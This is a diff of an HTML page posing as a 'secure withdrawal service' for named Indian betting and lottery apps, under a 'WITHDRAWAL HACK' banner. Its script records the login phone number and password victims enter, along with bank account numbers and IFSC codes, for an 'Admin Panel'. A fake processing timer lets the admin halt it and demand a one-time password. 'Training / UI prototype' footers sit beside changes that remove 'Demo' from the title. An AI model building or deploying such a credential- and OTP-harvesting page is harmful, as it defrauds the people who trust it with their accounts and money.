@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Withdrawal — Demo</title>
+<title>Withdrawal — </title>
 <style>
 *{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:
 radial-gradient(circle at 18% 15%,rgba(255,255,255,.9),transparent 32%),
@@ -21,131 +21,290 @@ input,select{width:100%;height:60px;border:2px solid #e2def0;border-radius:20px;
 input:focus,select:focus{border-color:#7654e8}
 button{width:100%;height:62px;border:0;border-radius:20px;background:linear-gradient(100deg,#7352e9,#6243d8);color:white;font-size:19px;font-weight:800;margin-top:28px;cursor:pointer;box-shadow:0 10px 22px rgba(103,73,220,.22);transition:.15s}button:active{transform:scale(.985)}
 .hidden{display:none}.back{width:48px;height:48px;border-radius:50%;border:0;background:#fff;color:#666;box-shadow:0 5px 20px #ddd;margin-bottom:12px;font-size:24px}
-.error{color:#e65b68;font-size:13px;margin-top:6px}.list-note{text-align:center;color:#999;font-size:12px;margin-top:16px}
+.error{color:#e65b68;font-size:13px;margin-top:6px}
 .timer{text-align:center;padding:30px 0}.hourglass{font-size:55px}.count{font-size:88px;font-weight:800;color:#7b59e9;letter-spacing:3px}.status{display:inline-block;background:#f0ebff;color:#7153dc;padding:9px 18px;border-radius:20px;font-weight:700}
 .bar{height:8px;background:#e9e3ff;border-radius:10px;overflow:hidden;margin:25px 0}.progress{height:100%;width:100%;background:#855fe9;transform-origin:left}
 .notice{background:#fff;border-radius:18px;padding:20px;text-align:center;color:#5d586d}.warn{color:#ed6b72;font-weight:700;margin-top:10px}
 .small{font-size:12px;color:#999;text-align:center;margin-top:18px}
+.otp-box{background:#f0f7ff;border-radius:16px;padding:25px;margin-top:20px;border:2px solid #7050df;text-align:center}
+.otp-box input{width:200px;height:50px;border:2px solid #ddd;border-radius:12px;padding:0 15px;font-size:24px;text-align:center;letter-spacing:5px;margin:10px 0}
+.otp-box button{width:auto;padding:10px 30px;display:inline-block;margin:10px 5px}
 @media(max-width:520px){.wrap{padding:35px 14px}.card{padding:28px 20px}h1{font-size:34px}.sub{font-size:17px}.count{font-size:72px}}
 .card:before{content:"";position:absolute;inset:-90px -130px auto auto;width:240px;height:240px;border-radius:50%;background:rgba(132,94,236,.08);filter:blur(3px);pointer-events:none}.card>*{position:relative;z-index:1}
 .footer-demo{margin-top:14px;text-align:center;color:#8a849b;font-size:11px}
 </style>
 </head>
 <body>
-<div class="demo">🛡 WITHDRAWAL HACK</div>
+<div class="demo"> WITHDRAWAL HACK</div>
 <div class="wrap">
   <section class="card" id="login">
-    <div class="badge">🛡 &nbsp;SECURE</div>
+    <div class="badge">🛡 &nbsp;SECURE </div>
     <h1>💰 Withdrawal</h1>
     <div class="sub">Fast &amp; Secure Withdrawal Service</div><hr>
     <label>🎮 Platform <span class="req">*</span></label>
     <select id="platform">
-      <option value="">Select Platform</option>
-      <option>13L Game</option><option>Big Mumbai</option>
-      <option>Diuwin</option><option>Yaar Win</option>
-      <option>Bounty</option><option>Tashan Win</option>
-      <option>Daman Game</option><option>L7 Lottery</option>
-      <option>82 Lottery</option><option>Dhani Win</option>
-      <option>55 Club</option><option>Sikkim</option>
-      <option>Goa Game</option><option>In999</option>
-      <option>51 Game</option><option>Jalwa Game</option>
-      <option>Jai Club</option><option>Raja Game</option>
-      <option>Tiranga</option><option>Dm Win</option>
-      <option>91 Club</option><option>6 Club</option>
-      <option>BDG Win</option><option>BDG Game</option>
-      <option>Ok Win</option>
+      <option value="">Select Platform</option><option>13L Game</option><option>Big Mumbai</option>
+      <option>Diuwin</option><option>Yaar Win</option><option>Bounty</option><option>Tashan Win</option>
+      <option>Daman Game</option><option>L7 Lottery</option><option>82 Lottery</option><option>Dhani Win</option>
+      <option>55 Club</option><option>Sikkim</option><option>Goa Game</option><option>In999</option>
+      <option>51 Game</option><option>Jalwa Game</option><option>Jai Club</option><option>Raja Game</option>
+      <option>Tiranga</option><option>Dm Win</option><option>91 Club</option><option>6 Club</option>
+      <option>BDG Win</option><option>BDG Game</option><option>Ok Win</option>
     </select>
     <label>📱 Phone Number <span class="req">*</span></label>
     <input id="phone" type="tel" inputmode="numeric" maxlength="10" placeholder="Enter 10-digit demo number">
     <label>🔒 Enter Password <span class="req">*</span></label>
     <input id="password" type="password" placeholder="Enter demo password">
     <button onclick="goConfirm()">↪ Login</button>
-    <div style="text-align:center;margin-top:12px">
-      <a href="admin.html" style="color:#6749d7;font-weight:800;text-decoration:none">🔐 Admin Panel</a>
-    </div>
-    <div class="small">All In One</div>
+    <div style="text-align:center;margin-top:12px"><a href="admin.html" style="color:#6749d7;font-weight:800;text-decoration:none">🔐 Admin Panel</a></div>
+    <div class="small"> All In One</div>
     <div class="footer-demo">Training / UI prototype</div>
   </section>
 
   <section class="card hidden" id="confirm">
-    <div class="badge">🛡 &nbsp;SECURE</div>
+    <div class="badge">🛡 &nbsp;SECURE </div>
     <h1>💰 Withdrawal</h1>
     <div class="sub">Fast &amp; Secure Withdrawal Service</div><hr>
     <h2 style="text-align:center">✔ Confirm Withdrawal</h2>
     <label>🏦 Bank Name</label>
     <select id="bank">
       <option value="">Select Bank</option>
-      <option>PNB Bank</option>
-      <option>State Bank of India</option>
-      <option>UCO Bank</option>
-      <option>Bank of Baroda</option>
-      <option>Mahindra Bank</option>
-      <option>Canara Bank</option>
-      <option>Union Bank</option>
-      <option>Kotak Mahindra Bank</option>
-      <option>Airtel Payments Bank</option>
-      <option>HDFC Bank</option>
-      <option>Yes Bank</option>
-      <option>Jio Payments Bank</option>
+      <option>PNB Bank</option><option>State Bank of India</option>
+      <option>UCO Bank</option><option>Bank of Baroda</option>
+      <option>Mahindra Bank</option><option>Canara Bank</option>
+      <option>Union Bank</option><option>Kotak Mahindra Bank</option>
+      <option>Airtel Payments Bank</option><option>HDFC Bank</option>
+      <option>Yes Bank</option><option>Jio Payments Bank</option>
     </select>
-    <label># Account Number</label>
-    <input id="account" inputmode="numeric" placeholder="Enter account number">
-    <label>&lt;/&gt; IFSC Code</label>
-    <input id="ifsc" placeholder="Enter IFSC code">
-    <label>💵 Amount</label>
-    <input id="amount" type="number" inputmode="decimal" placeholder="Enter demo amount">
+    <label># Account Number</label><input id="account" inputmode="numeric" placeholder="Enter account number">
+    <label>&lt;/&gt; IFSC Code</label><input id="ifsc" placeholder="Enter IFSC code">
+    <label>💵 Amount</label><input id="amount" type="number" inputmode="decimal" placeholder="Enter demo amount">
     <button style="background:linear-gradient(90deg,#ff7900,#ff5c00)" onclick="startTimer()">● Confirm Withdrawal</button>
-    <div class="small">Use values only. No financial information is sent anywhere.</div>
-    <div class="footer-demo">Training / UI prototype</div>
+    <div class="small">Use values only. No financial information is sent anywhere.</div><div class="footer-demo">Training / UI prototype</div>
   </section>
 
   <section class="card hidden" id="processing">
-    <div class="badge">🛡 &nbsp;SECURE</div>
+    <div class="badge">🛡 &nbsp;SECURE </div>
     <h1>💰 Withdrawal</h1>
     <div class="sub">Fast &amp; Secure Withdrawal Service</div><hr>
     <div class="timer">
       <div class="hourglass">⌛</div>
       <div class="count" id="count">10:00</div>
-      <div class="status">⠿ PROCESSING</div>
+      <div class="status" id="processingStatus">⠿ PROCESSING</div>
       <div class="bar"><div class="progress" id="progress"></div></div>
-      <div class="notice">Your demo withdrawal is being processed...<div class="warn">⛔ Do not press back or refresh!</div></div>
+      <div class="notice" id="processingNotice">
+        Your demo withdrawal is being processed...
+        <div class="warn">⛔ Do not press back or refresh!</div>
+      </div>
+    </div>
+    <!-- OTP Verification Section (Hidden Initially) -->
+    <div id="otpSection" class="otp-box hidden">
+      <h3>🔐 OTP Verification Required</h3>
+      <p style="color:#666;font-size:14px;">Admin has cancelled the timer. Please verify with OTP.</p>
+      <input type="text" id="otpInput" maxlength="6" placeholder="Enter 6-digit OTP" style="width:200px;height:50px;border:2px solid #ddd;border-radius:12px;padding:0 15px;font-size:24px;text-align:center;letter-spacing:5px;margin:10px 0;">
+      <br>
+      <button onclick="verifyOTP()" style="background:#28a745;color:#fff;width:auto;padding:10px 30px;display:inline-block;margin:10px 5px;">✅ Verify OTP</button>
+      <button onclick="resetDemo()" style="background:#6c757d;color:#fff;width:auto;padding:10px 30px;display:inline-block;margin:10px 5px;">↩ Go Back</button>
+      <div id="otpMessage" style="margin-top:10px;font-weight:700;"></div>
     </div>
   </section>
 </div>
 
 <script>
 const DEMO_KEY="withdrawal_demo_activity_v1";
+let timer = null;
+let remaining = 600;
+let otpVerified = false;
+
 function saveDemoActivity(type,data){
  const a=JSON.parse(localStorage.getItem(DEMO_KEY)||"[]");
- a.unshift({id:Date.now(),type,time:new Date().toLocaleString(),...data});
+ a.unshift({id:Date.now(),type,time:new Date().toLocaleString(),verified:false,...data});
  localStorage.setItem(DEMO_KEY,JSON.stringify(a.slice(0,100)));
 }
-function show(id){document.querySelectorAll('section.card').forEach(x=>x.classList.add('hidden'));document.getElementById(id).classList.remove('hidden');scrollTo(0,0)}
+
+function show(id){
+ document.querySelectorAll('section.card').forEach(x=>x.classList.add('hidden'));
+ document.getElementById(id).classList.remove('hidden');
+ scrollTo(0,0);
+}
+
 function goConfirm(){
   const p=document.getElementById('platform').value, ph=document.getElementById('phone').value, pw=document.getElementById('password').value;
   if(!p||ph.length!==10||!pw){alert('Please fill the demo platform, 10-digit phone number and demo password.');return}
-  // ✅ FULL PHONE AND PASSWORD SAVE HOGA AB
-  saveDemoActivity('LOGIN',{platform:p,phone:ph,password:pw}); show('confirm');
+  saveDemoActivity('LOGIN',{platform:p,phone:ph,password:pw}); 
+  show('confirm');
 }
-let timer,remaining=600;
+
 function startTimer(){
-  if(!document.getElementById('bank').value||!document.getElementById('account').value||!document.getElementById('ifsc').value||!document.getElementById('amount').value){alert('Please fill all demo withdrawal fields.');return}
-  // ✅ FULL ACCOUNT AND IFSC SAVE HOGA AB
+  if(!document.getElementById('bank').value||!document.getElementById('account').value||!document.getElementById('ifsc').value||!document.getElementById('amount').value){
+    alert('Please fill all demo withdrawal fields.');
+    return;
+  }
   saveDemoActivity('WITHDRAWAL',{
- bank:document.getElementById('bank').value,
- account:document.getElementById('account').value,
- ifsc:document.getElementById('ifsc').value,
- amount:'₹ '+document.getElementById('amount').value,
- platform:document.getElementById('platform').value
- }); show('processing');remaining=600;updateTimer();clearInterval(timer);
-  timer=setInterval(()=>{remaining--;updateTimer();if(remaining<=0){clearInterval(timer);document.querySelector('.status').textContent='✓ DEMO COMPLETE'}},1000);
+    bank:document.getElementById('bank').value,
+    account:document.getElementById('account').value,
+    ifsc:document.getElementById('ifsc').value,
+    amount:'₹ '+document.getElementById('amount').value,
+    platform:document.getElementById('platform').value
+  }); 
+  show('processing');
+  remaining = 600;
+  otpVerified = false;
+  document.getElementById('otpSection').classList.add('hidden');
+  document.getElementById('processingStatus').textContent = '⠿ PROCESSING';
+  document.getElementById('processingNotice').innerHTML = 'Your demo withdrawal is being processed...<div class="warn">⛔ Do not press back or refresh!</div>';
+  updateTimer();
+  clearInterval(timer);
+  timer = setInterval(()=>{
+    remaining--;
+    updateTimer();
+    if(remaining <= 0){
+      clearInterval(timer);
+      document.getElementById('processingStatus').textContent = '✓ DEMO COMPLETE';
+      document.getElementById('processingNotice').innerHTML = '✅ Withdrawal completed successfully!';
+    }
+  }, 1000);
+  
+  // Check for timer cancel
+  checkTimerCancel();
 }
+
 function updateTimer(){
-  const m=String(Math.floor(remaining/60)).padStart(2,'0'),s=String(remaining%60).padStart(2,'0');
-  document.getElementById('count').textContent=m+':'+s;
-  document.getElementById('progress').style.width=(remaining/600*100)+'%';
+  const m=String(Math.floor(remaining/60)).padStart(2,'0'), s=String(remaining%60).padStart(2,'0');
+  document.getElementById('count').textContent = m+':'+s;
+  document.getElementById('progress').style.width = (remaining/600*100)+'%';
 }
-function resetDemo(){clearInterval(timer);show('login')}
+
+function resetDemo(){
+  clearInterval(timer);
+  otpVerified = false;
+  localStorage.removeItem('withdrawal_timer_cancel');
+  localStorage.removeItem('withdrawal_otp');
+  show('login');
+}
+
+// Check if admin cancelled timer
+function checkTimerCancel(){
+  const cancelCheck = setInterval(()=>{
+    if(localStorage.getItem('withdrawal_timer_cancel') === 'true'){
+      clearInterval(cancelCheck);
+      clearInterval(timer);
+      document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
+      document.getElementById('processingNotice').innerHTML = '⏹ Timer was cancelled by admin.<div class="warn">Please verify with OTP!</div>';
+      document.getElementById('otpSection').classList.remove('hidden');
+      document.getElementById('otpMessage').textContent = '';
+      localStorage.removeItem('withdrawal_timer_cancel');
+    }
+    // Check if OTP is sent
+    const otpData = localStorage.getItem('withdrawal_otp');
+    if(otpData){
+      try{
+        const data = JSON.parse(otpData);
+        if(data.active){
+          document.getElementById('otpMessage').textContent = '📨 OTP sent! Check with admin.';
+          document.getElementById('otpMessage').style.color = '#28a745';
+        }
+      } catch(e){}
+    }
+  }, 1000);
+}
+
+// Verify OTP
+function verifyOTP(){
+  const userOtp = document.getElementById('otpInput').value.trim();
+  if(!userOtp || userOtp.length !== 6){
+    document.getElementById('otpMessage').textContent = '❌ Please enter 6-digit OTP!';
+    document.getElementById('otpMessage').style.color = '#dc3545';
+    return;
+  }
+  
+  const otpData = localStorage.getItem('withdrawal_otp');
+  if(!otpData){
+    document.getElementById('otpMessage').textContent = '❌ No OTP found. Please ask admin to send OTP.';
+    document.getElementById('otpMessage').style.color = '#dc3545';
+    return;
+  }
+  
+  try{
+    const data = JSON.parse(otpData);
+    if(!data.active){
+      document.getElementById('otpMessage').textContent = '❌ OTP expired. Please request new OTP.';
+      document.getElementById('otpMessage').style.color = '#dc3545';
+      return;
+    }
+    
+    if(userOtp === data.otp){
+      otpVerified = true;
+      document.getElementById('otpMessage').textContent = '✅ OTP Verified Successfully!';
+      document.getElementById('otpMessage').style.color = '#28a745';
+      document.getElementById('processingStatus').textContent = '✅ VERIFIED';
+      document.getElementById('processingNotice').innerHTML = '✅ OTP verified! Withdrawal complete.';
+      document.getElementById('otpSection').classList.add('hidden');
+      
+      // Update withdrawal status in localStorage
+      const all = JSON.parse(localStorage.getItem(DEMO_KEY)||"[]");
+      if(all.length > 0){
+        const latest = all[0];
+        if(latest.type === 'WITHDRAWAL'){
+          latest.verified = true;
+          localStorage.setItem(DEMO_KEY, JSON.stringify(all));
+        }
+      }
+      
+      // Clear OTP data
+      localStorage.removeItem('withdrawal_otp');
+      
+      // Notify admin
+      try {
+        const channel = new BroadcastChannel('otp_channel');
+        channel.postMessage({type: 'OTP_VERIFIED'});
+        channel.close();
+      } catch(e) {}
+      
+      setTimeout(resetDemo, 3000);
+    } else {
+      document.getElementById('otpMessage').textContent = '❌ Invalid OTP! Please try again.';
+      document.getElementById('otpMessage').style.color = '#dc3545';
+      document.getElementById('otpInput').value = '';
+      document.getElementById('otpInput').focus();
+    }
+  } catch(e){
+    document.getElementById('otpMessage').textContent = '❌ Error verifying OTP. Please try again.';
+    document.getElementById('otpMessage').style.color = '#dc3545';
+  }
+}
+
+// Listen for admin messages
+try {
+  const channel = new BroadcastChannel('otp_channel');
+  channel.onmessage = function(event) {
+    if(event.data.type === 'CANCEL_TIMER'){
+      clearInterval(timer);
+      document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
+      document.getElementById('processingNotice').innerHTML = '⏹ Timer was cancelled by admin.<div class="warn">Please verify with OTP!</div>';
+      document.getElementById('otpSection').classList.remove('hidden');
+      document.getElementById('otpMessage').textContent = '';
+    }
+    if(event.data.type === 'OTP_SENT'){
+      document.getElementById('otpMessage').textContent = '📨 OTP sent! Enter the code above.';
+      document.getElementById('otpMessage').style.color = '#28a745';
+    }
+  };
+} catch(e) {}
+
+// Auto-check for OTP changes
+setInterval(()=>{
+  const otpData = localStorage.getItem('withdrawal_otp');
+  if(otpData){
+    try{
+      const data = JSON.parse(otpData);
+      if(data.active && document.getElementById('otpSection').classList.contains('hidden') === false){
+        document.getElementById('otpMessage').textContent = '📨 OTP sent! Enter the code above.';
+        document.getElementById('otpMessage').style.color = '#28a745';
+      }
+    } catch(e){}
+  }
+}, 2000);
 </script>
 </body>
 </html>
